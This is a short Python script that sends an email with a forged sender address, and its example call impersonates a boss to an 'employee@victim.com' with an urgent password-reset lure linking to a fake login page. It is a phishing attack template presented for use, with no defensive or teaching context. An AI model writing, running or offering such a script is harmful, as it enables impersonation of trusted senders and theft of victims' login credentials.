import smtplib
import ssl
from email.mime.text import MIMEText

def send_spoofed_email(from_addr, to_addr, subject, body, smtp_server, port=587):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = from_addr
    msg['To'] = to_addr

    context = ssl.create_default_context()
    with smtplib.SMTP(smtp_server, port) as server:
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.sendmail(from_addr, to_addr, msg.as_string())

send_spoofed_email("boss@company.com", "employee@victim.com", "Urgent: Reset Password", "Click here: http://fake-login.com", "smtp.gmail.com")
